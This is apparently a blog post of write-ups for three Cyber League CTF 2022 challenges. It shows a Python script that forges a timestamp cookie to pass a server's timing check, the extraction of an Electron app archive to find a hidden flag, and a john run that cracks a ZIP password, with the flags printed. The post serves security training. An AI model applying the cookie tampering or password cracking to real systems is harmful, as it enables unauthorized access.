---
layout: post
title: Cyber League CTF 2022 - Writeups
categories:
- CTF
- Web-exploitation
tags:
- CTF
- Web-exploitation
- Forensics
- Cyber-League
---

## Simulated bomb drill

```python
import requests
import base64

s = requests.Session()
print(s.cookies.get_dict())

res = s.get('http://13.213.72.54:5003/')

# Get time elapsed in microseconds
time_elapsed = res.elapsed
time_elapsed = time_elapsed.total_seconds()
print(res.elapsed)


time_to_decode = s.cookies.get_dict()['princesspeach']
decoded_datetime = base64.b64decode(time_to_decode).decode('utf-8')
decoded_time = decoded_datetime.split('.')
decoded_microseconds = decoded_datetime.split('.')[1]
decoded_microseconds_in_seconds = int(decoded_microseconds)/1000000

new_time = decoded_microseconds_in_seconds - time_elapsed
new_time_in_microseconds = int(new_time * 1000000)

decoded_time[1] = str(new_time_in_microseconds)

to_encode = ''.join(decoded_time)
encoded_time = base64.b64encode(bytes(to_encode, 'utf-8'))

s.cookies['princesspeach'] = encoded_time
res = s.get('http://13.213.72.54:5003/defuse')
print(res.content)
```

## Write farewell letters

```bash
➜  cyleague cd peekaboo.app 
➜  peekaboo.app cd Contents 
➜  Contents cd Resources 
➜  Resources ls
am.lproj      de.lproj      fi.lproj      id.lproj      mr.lproj      ro.lproj      te.lproj
app.asar      el.lproj      fil.lproj     it.lproj      ms.lproj      ru.lproj      th.lproj
ar.lproj      en.lproj      fr.lproj      ja.lproj      nb.lproj      sk.lproj      tr.lproj
bg.lproj      en_GB.lproj   gu.lproj      kn.lproj      nl.lproj      sl.lproj      uk.lproj
bn.lproj      es.lproj      he.lproj      ko.lproj      peekaboo.icns sr.lproj      vi.lproj
ca.lproj      es_419.lproj  hi.lproj      lt.lproj      pl.lproj      sv.lproj      zh_CN.lproj
cs.lproj      et.lproj      hr.lproj      lv.lproj      pt_BR.lproj   sw.lproj      zh_TW.lproj
da.lproj      fa.lproj      hu.lproj      ml.lproj      pt_PT.lproj   ta.lproj
➜  Resources mkdir decompile-electron
➜  Resources asar extract app.asar decompile-electron 
➜  Resources cd decompile-electron 
➜  decompile-electron code .
```

In js > index.js

```javascript
var visibilitySetting = 'hidden'

function load() {
    document.getElementById('showButton').innerHTML = 'show'
}

function showVersions() {
    if (visibilitySetting === 'visible') {
        visibilitySetting = 'hidden'
        document.getElementById('versions').style.visibility = 'hidden'
        document.getElementById('showButton').innerHTML = 'show'
    }
    else {
        visibilitySetting = 'visible'
        document.getElementById('versions').style.visibility =' visible'
        document.getElementById('showButton').innerHTML = 'hide'
    }
}

function shinyKnob() {
    console.log('CYBERLEAGUE{7h3_cu73n355_15_5720n9_w17h_7h15_0n3}')
}
```

## Understand space politics

```bash
┌──(kali㉿kali)-[~/Documents]
└─$ zip2john hello_there.zip > ziphashes
ver 2.0 hello_there.zip/hello_there.txt PKZIP Encr: cmplen=41, decmplen=29, crc=87D14E54 ts=A8AF cs=87d1 type=0
                                                       
┌──(kali㉿kali)-[~/Documents]
└─$ cat ziphashes 
hello_there.zip/hello_there.txt:$pkzip$1*1*2*0*29*1d*87d14e54*0*2d*0*29*87d1*8facba0e3e10e650ad9dc1fc89e000dfcff60fe4858a519eb33e8f1f9380a9633f39729fb0e101c9eb*$/pkzip$:hello_there.txt:hello_there.zip::hello_there.zip
                                                       
┌──(kali㉿kali)-[~/Documents]
└─$ john ziphashes 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
2hot4u           (hello_there.zip/hello_there.txt)     
1g 0:00:00:02 DONE 3/3 (2022-05-01 09:13) 0.3521g/s 2067Kp/s 2067Kc/s 2067KC/s cjjlip..2hul83
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                       
┌──(kali㉿kali)-[~/Documents]
└─$ unzip hello_there.zip 
Archive:  hello_there.zip
[hello_there.zip] hello_there.txt password: 
 extracting: hello_there.txt         
                                                       
┌──(kali㉿kali)-[~/Documents]
└─$ cat hello_there.txt 
CYBERLEAGUE{Y0U_Fo|_|nD_3e!}
```
